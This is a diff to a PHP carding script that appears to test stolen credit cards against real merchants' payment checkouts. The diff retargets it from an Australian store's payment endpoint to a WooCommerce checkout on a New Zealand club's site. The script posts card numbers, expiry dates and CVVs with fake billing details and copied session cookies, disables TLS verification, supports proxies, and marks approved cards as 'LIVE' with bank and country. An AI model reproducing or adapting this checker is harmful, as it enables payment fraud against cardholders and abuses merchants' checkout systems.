@@ -205,7 +205,7 @@ curl_close($ch);
 // // //////////////////////// START REQUEST 2 ////////////////////////
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.itytechnology.com.au/store/index.php?route=payment/anz/send');
+curl_setopt($ch, CURLOPT_URL, 'https://alpineclub.org.nz/?wc-ajax=checkout');
 
 //////////////////////// PROXY CALLS ////////////////////////////
 //               REMOVE '//' FOR PROXIES TO WORK BELOW
@@ -234,20 +234,19 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'Accept: application/json, text/javascript, */*; q=0.01',
-'Accept-Encoding: gzip, deflate, br',
-'Accept-Language: en-US,en;q=0.9',
-'Content-Type: application/x-www-form-urlencoded',
-'Cookie: display=list; PHPSESSID=b94bd6f1b55120302e991e902339caee; language=en; currency=AUD',
-'Host: www.citytechnology.com.au',
-'Origin: https://www.citytechnology.com.au',
-'Referer: https://www.citytechnology.com.au/store/index.php?route=checkout/checkout',
+'accept: application/json, text/javascript, */*; q=0.01',
+'accept-encoding: gzip, deflate, br',
+'accept-language: en-US,en;q=0.9',
+'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+'cookie: __cfduid=d2d36f7039afe6b43f5527fe9ec8288fa1601870448; PHPSESSID=a164dde119c34119fb98d1048e34f55a; woocommerce_items_in_cart=1; wp_woocommerce_session_e3053ee089c390d746dea1ed9bba8429=c386dde35dc7c4402ca7bb8cd8536389%7C%7C1602350055%7C%7C1602346455%7C%7C64e4595f342a47f03192f336692b78ca; woocommerce_cart_hash=01bbef63f4e7bb779e6a365dd7fe2216',
+'origin: https://alpineclub.org.nz',
+'referer: https://alpineclub.org.nz/checkout/',
 'user-agent: '.$browser.''
 ));
 
 //////////////////////// START POST FILED 1 ////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'vpc_CardNum='.$cc.'&selMonth='.$mes.'&selYear='.$ano.'&vpc_CardSecurityCode='.$cvv.'');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'billing_first_name=Vincnet&billing_last_name=Warner&billing_company=&billing_country=AU&billing_address_1=12+avenue&billing_address_2=&billing_city=Auckland&billing_state=WA&billing_postcode=3100&billing_phone=42411514&billing_email=vvarner%40hmsi.com&account_password=&order_comments=&payment_method=flowpro&ccnum='.$cc.'&cardtype=0&expmonth='.$mes.'&expyear='.$ano.'&cvv='.$cvv.'&_wpnonce=4c321617f0&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&g-recaptcha-response=');
 
 // // // // //*****************************************************************************************************************************************************************************************************************************************************************************
 
@@ -257,14 +256,14 @@ if (curl_errno($ch)) {
     echo 'Error:'.curl_error($ch);
 }
 curl_close($ch);
-$message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\tPayment failed: ','\t\t<\/li>\n\t<\/ul>\n"')));
+$message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\">\n\t\t\t<li>Payment error:','<\/li>\n\t<\/ul>\n"')));
 // $code = trim(strip_tags(getstr($result,'"errorCode":"','"')));
 // // // $message2 = trim(strip_tags(getstr($result,'"message": "','"')));
 
 
 
 // // /////////////////////// RESULT ////////////////////////////////////
-if(strpos($result,'"success"')){
+if(strpos($result,'"result":"success"')){
 // updatecart();
     echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ L I V E ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
     }
